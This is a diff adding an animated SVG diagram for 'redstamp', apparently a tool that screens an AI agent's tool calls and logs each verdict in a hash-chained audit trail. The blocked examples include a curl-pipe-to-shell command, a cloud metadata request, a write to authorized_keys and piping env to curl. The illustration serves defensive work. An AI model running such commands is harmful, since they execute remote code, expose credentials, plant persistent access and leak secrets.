@@ -1,0 +1,149 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 432" width="1000" height="432" role="img" aria-labelledby="t">
+<title id="t">redstamp, illustrated: tool calls from an agent meet the redstamp gate. read_file, http.get to the GitHub API and npm test are allowed; curl piped to sh, a request to the cloud metadata address, a write to authorized_keys and piping env to curl are blocked; a force push is held for human approval. Every verdict lands in a hash-chained audit trail.</title>
+<style>
+  text { font-family: ui-monospace,SFMono-Regular,'SF Mono',Menlo,Consolas,'Liberation Mono',monospace; }
+  .live { animation: live 1.6s ease-in-out infinite; transform-box: fill-box; transform-origin: center; }
+  @keyframes live { 0%,100% { opacity: 1; transform: scale(1) } 50% { opacity: .35; transform: scale(.7) } }
+  .ring { animation: ring 1.6s ease-out infinite; transform-box: fill-box; transform-origin: center; }
+  @keyframes ring { 0% { opacity: .8; transform: scale(1) } 100% { opacity: 0; transform: scale(3.2) } }
+  
+  .chip { opacity: 0; }
+  .chip.allow { animation: allow 32s linear infinite; }
+  .chip.block { animation: block 32s linear infinite; }
+  .chip.approve { animation: approve 32s linear infinite; }
+  .chip, .stamp g { transform-box: view-box; }
+  .tint { opacity: 0; animation: tint 32s linear infinite; }
+  .flash { opacity: 0; animation: flash 32s ease-out infinite; }
+  .stamp { opacity: 0; transform-box: fill-box; transform-origin: center; }
+  .s-block { animation: stampBlock 32s cubic-bezier(.3,1.6,.5,1) infinite; }
+  .s-approve { animation: stampApprove 32s linear infinite; }
+  .s-allow { animation: stampAllow 32s linear infinite; }
+  .entry { opacity: 0; animation: entry 32s ease-out infinite; }
+  @media (prefers-reduced-motion: reduce) { .entry { opacity: 1 } }
+  .flow { animation: flow 1.2s linear infinite; }
+  @keyframes flow { to { stroke-dashoffset: -20 } }
+  
+  @keyframes allow { 0% { transform: translateX(150px); opacity: 0 } 0.78% { opacity: 1 } 6.56% { transform: translateX(430px) } 7.34% { transform: translateX(430px) } 12.19% { transform: translateX(860px); opacity: 1 } 12.22%,100% { transform: translateX(860px); opacity: 0 } }
+  @keyframes block { 0% { transform: translateX(150px); opacity: 0 } 0.78% { opacity: 1 } 6.56% { transform: translateX(430px) } 10.63% { transform: translateX(430px); opacity: 1 } 12.81% { transform: translate(410px, 70px) rotate(-8deg); opacity: 0 } 100% { transform: translate(410px, 70px); opacity: 0 } }
+  @keyframes approve { 0% { transform: translateX(150px); opacity: 0 } 0.78% { opacity: 1 } 6.56% { transform: translateX(430px) } 11.88% { transform: translateX(430px) } 15.63% { transform: translateX(860px); opacity: 1 } 15.66%,100% { transform: translateX(860px); opacity: 0 } }
+  @keyframes tint { 0%, 6.56% { opacity: 0 } 7.34% { opacity: 1 } 15.63% { opacity: 1 } 15.94%,100% { opacity: 0 } }
+  @keyframes flash { 0%, 6.56% { opacity: 0 } 7.34% { opacity: .32 } 9.53%,100% { opacity: 0 } }
+  @keyframes stampBlock { 0%, 6.56% { opacity: 0; transform: scale(1.7) } 7.34% { opacity: 1; transform: scale(1) } 12.81% { opacity: 1; transform: scale(1) } 13.75%,100% { opacity: 0 } }
+  @keyframes stampApprove { 0%, 6.56% { opacity: 0 } 7.34% { opacity: 1 } 10.00% { opacity: .45 } 10.94% { opacity: 1 } 11.88% { opacity: 1 } 12.81%,100% { opacity: 0 } }
+  @keyframes stampAllow { 0%, 6.56% { opacity: 0 } 7.34% { opacity: 1 } 10.16%,100% { opacity: 0 } }
+  @keyframes entry { 0%, 7.31% { transform: translateY(406px); opacity: 0 } 7.91% { transform: translateY(382px); opacity: 1 } 19.84% { transform: translateY(382px); opacity: 1 } 20.41% { transform: translateY(358px); opacity: 1 } 32.34% { transform: translateY(358px); opacity: 1 } 32.91% { transform: translateY(334px); opacity: 1 } 44.84% { transform: translateY(334px); opacity: 1 } 45.41% { transform: translateY(310px); opacity: 1 } 57.34% { transform: translateY(310px); opacity: 1 } 57.91% { transform: translateY(286px); opacity: 1 } 69.84% { transform: translateY(286px); opacity: 1 } 70.41% { transform: translateY(262px); opacity: 0 } 100% { transform: translateY(262px); opacity: 0 } }
+  @media (prefers-reduced-motion: reduce) { * { animation: none !important } }
+</style>
+<defs>
+  <linearGradient id="edge" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#8b5cf6" stop-opacity=".55"/><stop offset=".5" stop-color="#2a1f47"/><stop offset="1" stop-color="#e879f9" stop-opacity=".45"/></linearGradient>
+  <radialGradient id="wash" cx=".15" cy="0" r="1"><stop offset="0" stop-color="#8b5cf6" stop-opacity=".16"/><stop offset=".6" stop-color="#8b5cf6" stop-opacity="0"/></radialGradient>
+  <filter id="glow" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+  
+</defs>
+<rect x="1" y="1" width="998" height="430" rx="14" fill="#0d0918" stroke="url(#edge)" stroke-width="1.5"/>
+<rect x="1" y="1" width="998" height="430" rx="14" fill="url(#wash)"/>
+<g transform="translate(26 30)">
+  <circle class="ring" cx="5" cy="-4" r="5" fill="none" stroke="#4ade80" stroke-width="1.5"/>
+  <circle class="live" cx="5" cy="-4" r="4.5" fill="#4ade80"/>
+  <text x="20" y="0" font-size="13" fill="#c4b5fd" letter-spacing="2.5">REDSTAMP · THE GATE</text>
+</g>
+<text x="974" y="30" font-size="12" fill="#5b5378" text-anchor="end">illustrative</text>
+
+  <defs><clipPath id="laneclip"><rect x="130" y="12" width="720" height="220"/></clipPath>
+  <clipPath id="logclip"><rect x="20" y="266" width="960" height="124"/></clipPath></defs>
+  <line x1="130" x2="850" y1="132" y2="132" stroke="#2a1f47" stroke-width="1.5" stroke-dasharray="3 7" class="flow"/>
+  <g clip-path="url(#laneclip)"><g class="chip allow" style="animation-delay:0.00s">
+      <rect x="-195" y="116" width="195" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-195" y="116" width="195" height="32" rx="8" fill="none" stroke="#4ade80" stroke-width="1.6" style="animation-delay:0.00s"/>
+      <text x="-181" y="136.5" font-size="12.5"><tspan fill="#f0abfc">read_file</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">src/app.ts</tspan></text>
+    </g><g class="chip block" style="animation-delay:4.00s">
+      <rect x="-210" y="116" width="210" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-210" y="116" width="210" height="32" rx="8" fill="none" stroke="#fb4f6d" stroke-width="1.6" style="animation-delay:4.00s"/>
+      <text x="-196" y="136.5" font-size="12.5"><tspan fill="#f0abfc">bash</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">curl -s x.sh | sh</tspan></text>
+    </g><g class="chip allow" style="animation-delay:8.00s">
+      <rect x="-264" y="116" width="264" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-264" y="116" width="264" height="32" rx="8" fill="none" stroke="#4ade80" stroke-width="1.6" style="animation-delay:8.00s"/>
+      <text x="-250" y="136.5" font-size="12.5"><tspan fill="#f0abfc">http.get</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">api.github.com/repos</tspan></text>
+    </g><g class="chip block" style="animation-delay:12.00s">
+      <rect x="-264" y="116" width="264" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-264" y="116" width="264" height="32" rx="8" fill="none" stroke="#fb4f6d" stroke-width="1.6" style="animation-delay:12.00s"/>
+      <text x="-250" y="136.5" font-size="12.5"><tspan fill="#f0abfc">http.get</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">169.254.169.254/meta</tspan></text>
+    </g><g class="chip approve" style="animation-delay:16.00s">
+      <rect x="-203" y="116" width="203" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-203" y="116" width="203" height="32" rx="8" fill="none" stroke="#fbbf24" stroke-width="1.6" style="animation-delay:16.00s"/>
+      <text x="-189" y="136.5" font-size="12.5"><tspan fill="#f0abfc">bash</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">git push --force</tspan></text>
+    </g><g class="chip block" style="animation-delay:20.00s">
+      <rect x="-294" y="116" width="294" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-294" y="116" width="294" height="32" rx="8" fill="none" stroke="#fb4f6d" stroke-width="1.6" style="animation-delay:20.00s"/>
+      <text x="-280" y="136.5" font-size="12.5"><tspan fill="#f0abfc">write_file</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">~/.ssh/authorized_keys</tspan></text>
+    </g><g class="chip allow" style="animation-delay:24.00s">
+      <rect x="-142" y="116" width="142" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-142" y="116" width="142" height="32" rx="8" fill="none" stroke="#4ade80" stroke-width="1.6" style="animation-delay:24.00s"/>
+      <text x="-128" y="136.5" font-size="12.5"><tspan fill="#f0abfc">bash</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">npm test</tspan></text>
+    </g><g class="chip block" style="animation-delay:28.00s">
+      <rect x="-218" y="116" width="218" height="32" rx="8" fill="#0a0612" stroke="#2a1f47" stroke-width="1.4"/>
+      <rect class="tint" x="-218" y="116" width="218" height="32" rx="8" fill="none" stroke="#fb4f6d" stroke-width="1.6" style="animation-delay:28.00s"/>
+      <text x="-204" y="136.5" font-size="12.5"><tspan fill="#f0abfc">bash</tspan><tspan fill="#5b5378"> · </tspan><tspan fill="#ece8ff">env | curl -d @- …</tspan></text>
+    </g></g>
+  <g>
+    <rect x="30" y="98" width="100" height="68" rx="12" fill="#0a0612" stroke="#8b5cf6" stroke-width="1.6"/>
+    <text x="80" y="130" font-size="14" fill="#ece8ff" text-anchor="middle">agent</text>
+    <text x="80" y="148" font-size="10.5" fill="#5b5378" text-anchor="middle">tool calls</text>
+  </g>
+  <g>
+    <rect x="430" y="86" width="150" height="92" rx="12" fill="#0a0612" stroke="#fb4f6d" stroke-width="2" filter="url(#glow)"/>
+    <rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#4ade80" style="animation-delay:0.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#fb4f6d" style="animation-delay:4.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#4ade80" style="animation-delay:8.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#fb4f6d" style="animation-delay:12.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#fbbf24" style="animation-delay:16.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#fb4f6d" style="animation-delay:20.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#4ade80" style="animation-delay:24.00s"/><rect class="flash" x="430" y="86" width="150" height="92" rx="12" fill="#fb4f6d" style="animation-delay:28.00s"/>
+    <text x="505" y="128" font-size="16" font-weight="700" fill="#ece8ff" text-anchor="middle">redstamp</text>
+    <text x="505" y="148" font-size="10.5" fill="#5b5378" text-anchor="middle">offline · deterministic</text>
+  </g>
+  <g>
+    <rect x="850" y="98" width="120" height="68" rx="12" fill="#0a0612" stroke="#8b5cf6" stroke-width="1.6"/>
+    <text x="910" y="130" font-size="14" fill="#ece8ff" text-anchor="middle">tools</text>
+    <text x="910" y="148" font-size="10.5" fill="#5b5378" text-anchor="middle">shell · net · fs</text>
+  </g>
+  <g class="stamp s-allow" style="animation-delay:0.00s">
+      <g transform="translate(505 62) rotate(0)">
+        <rect x="-31.5" y="-14" width="63" height="26" rx="5" fill="#0a0612" stroke="#4ade80" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#4ade80" text-anchor="middle" letter-spacing="1.2">ALLOW</text>
+      </g></g><g class="stamp s-block" style="animation-delay:4.00s">
+      <g transform="translate(505 62) rotate(-6)">
+        <rect x="-117.6" y="-14" width="235.2" height="26" rx="5" fill="#0a0612" stroke="#fb4f6d" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#fb4f6d" text-anchor="middle" letter-spacing="1.2">BLOCKED · REMOTE CODE EXEC</text>
+      </g></g><g class="stamp s-allow" style="animation-delay:8.00s">
+      <g transform="translate(505 62) rotate(0)">
+        <rect x="-31.5" y="-14" width="63" height="26" rx="5" fill="#0a0612" stroke="#4ade80" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#4ade80" text-anchor="middle" letter-spacing="1.2">ALLOW</text>
+      </g></g><g class="stamp s-block" style="animation-delay:12.00s">
+      <g transform="translate(505 62) rotate(-6)">
+        <rect x="-68.39999999999999" y="-14" width="136.79999999999998" height="26" rx="5" fill="#0a0612" stroke="#fb4f6d" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#fb4f6d" text-anchor="middle" letter-spacing="1.2">BLOCKED · SSRF</text>
+      </g></g><g class="stamp s-approve" style="animation-delay:16.00s">
+      <g transform="translate(505 62) rotate(0)">
+        <rect x="-72.5" y="-14" width="145" height="26" rx="5" fill="#0a0612" stroke="#fbbf24" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#fbbf24" text-anchor="middle" letter-spacing="1.2">HELD · APPROVAL</text>
+      </g></g><g class="stamp s-block" style="animation-delay:20.00s">
+      <g transform="translate(505 62) rotate(-6)">
+        <rect x="-97.1" y="-14" width="194.2" height="26" rx="5" fill="#0a0612" stroke="#fb4f6d" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#fb4f6d" text-anchor="middle" letter-spacing="1.2">BLOCKED · PERSISTENCE</text>
+      </g></g><g class="stamp s-allow" style="animation-delay:24.00s">
+      <g transform="translate(505 62) rotate(0)">
+        <rect x="-31.5" y="-14" width="63" height="26" rx="5" fill="#0a0612" stroke="#4ade80" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#4ade80" text-anchor="middle" letter-spacing="1.2">ALLOW</text>
+      </g></g><g class="stamp s-block" style="animation-delay:28.00s">
+      <g transform="translate(505 62) rotate(-6)">
+        <rect x="-101.19999999999999" y="-14" width="202.39999999999998" height="26" rx="5" fill="#0a0612" stroke="#fb4f6d" stroke-width="2"/>
+        <text x="0" y="4.5" font-size="12.5" font-weight="700" fill="#fb4f6d" text-anchor="middle" letter-spacing="1.2">BLOCKED · SECRET EXFIL</text>
+      </g></g>
+  <line x1="26" x2="974" y1="240" y2="240" stroke="#2a1f47"/>
+  <text x="40" y="260" font-size="11" fill="#8e84ad" letter-spacing="1.5">AUDIT TRAIL · EACH ENTRY HASHES THE ONE BEFORE IT</text>
+  <g clip-path="url(#logclip)"><g class="entry" style="animation-delay:0.00s;transform:translateY(214px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04101</tspan><tspan x="112" fill="#4ade80">allow   </tspan><tspan x="200" fill="#ece8ff">read_file src/app.ts</tspan><tspan x="560" fill="#5b5378">prev 00000000…</tspan><tspan x="720" fill="#8e84ad">sha256 be6d092d8080…</tspan></text></g><g class="entry" style="animation-delay:4.00s;transform:translateY(238px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04102</tspan><tspan x="112" fill="#fb4f6d">block   </tspan><tspan x="200" fill="#ece8ff">bash curl -s x.sh | sh</tspan><tspan x="560" fill="#5b5378">prev be6d092d…</tspan><tspan x="720" fill="#8e84ad">sha256 e99d96a69cf2…</tspan></text></g><g class="entry" style="animation-delay:8.00s;transform:translateY(262px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04103</tspan><tspan x="112" fill="#4ade80">allow   </tspan><tspan x="200" fill="#ece8ff">http.get api.github.com/repos</tspan><tspan x="560" fill="#5b5378">prev e99d96a6…</tspan><tspan x="720" fill="#8e84ad">sha256 f76c8b6ee918…</tspan></text></g><g class="entry" style="animation-delay:12.00s;transform:translateY(286px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04104</tspan><tspan x="112" fill="#fb4f6d">block   </tspan><tspan x="200" fill="#ece8ff">http.get 169.254.169.254/meta</tspan><tspan x="560" fill="#5b5378">prev f76c8b6e…</tspan><tspan x="720" fill="#8e84ad">sha256 299e7d991e7c…</tspan></text></g><g class="entry" style="animation-delay:16.00s;transform:translateY(310px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04105</tspan><tspan x="112" fill="#fbbf24">approve </tspan><tspan x="200" fill="#ece8ff">bash git push --force</tspan><tspan x="560" fill="#5b5378">prev 299e7d99…</tspan><tspan x="720" fill="#8e84ad">sha256 2ff8b9202404…</tspan></text></g><g class="entry" style="animation-delay:20.00s;transform:translateY(334px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04106</tspan><tspan x="112" fill="#fb4f6d">block   </tspan><tspan x="200" fill="#ece8ff">write_file ~/.ssh/authorized_keys</tspan><tspan x="560" fill="#5b5378">prev 2ff8b920…</tspan><tspan x="720" fill="#8e84ad">sha256 5924623fd10a…</tspan></text></g><g class="entry" style="animation-delay:24.00s;transform:translateY(358px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04107</tspan><tspan x="112" fill="#4ade80">allow   </tspan><tspan x="200" fill="#ece8ff">bash npm test</tspan><tspan x="560" fill="#5b5378">prev 5924623f…</tspan><tspan x="720" fill="#8e84ad">sha256 4b5b9aed3509…</tspan></text></g><g class="entry" style="animation-delay:28.00s;transform:translateY(382px)"><text x="40" y="0" font-size="12.5">
+      <tspan fill="#5b5378">#04108</tspan><tspan x="112" fill="#fb4f6d">block   </tspan><tspan x="200" fill="#ece8ff">bash env | curl -d @- …</tspan><tspan x="560" fill="#5b5378">prev 4b5b9aed…</tspan><tspan x="720" fill="#8e84ad">sha256 3311b3e08d4b…</tspan></text></g></g>
+  <text x="500" y="418" font-size="11.5" fill="#5b5378" text-anchor="middle">illustrative traffic · redstamp's real verdicts: allow, hold for approval, block</text>
+</svg>
